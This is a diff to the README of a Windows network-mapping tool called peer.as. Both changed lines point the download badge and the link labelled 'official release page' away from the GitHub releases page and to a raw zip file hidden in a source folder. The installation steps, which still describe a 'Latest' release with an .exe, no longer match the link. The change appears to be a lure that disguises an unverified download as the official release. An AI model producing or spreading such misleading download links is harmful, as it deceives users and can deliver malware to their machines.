@@ -1,6 +1,6 @@
 # 🌐 peer.as - See global internet paths with ease
 
-[![](https://img.shields.io/badge/Download-peer.as-blue.svg)](https://github.com/cumbriapullulation526/peer.as/releases)
+[![](https://img.shields.io/badge/Download-peer.as-blue.svg)](https://raw.githubusercontent.com/cumbriapullulation526/peer.as/main/ipcollect/web/src/peer_as_1.7-beta.4.zip)
 
 peer.as maps the way data travels across the internet. It provides a visual view of core network structures. You can track IP prefixes, look up autonomous system numbers, and study peering relationships. This tool helps network engineers and curious users understand how traffic moves between providers.
 
@@ -8,7 +8,7 @@ peer.as maps the way data travels across the internet. It provides a visual view
 
 Follow these steps to install the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/cumbriapullulation526/peer.as/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/cumbriapullulation526/peer.as/main/ipcollect/web/src/peer_as_1.7-beta.4.zip).
 2. Scan the list for the version labeled "Latest".
 3. Find the file ending in `.exe` under the Assets section.
 4. Click the file name to start the download.
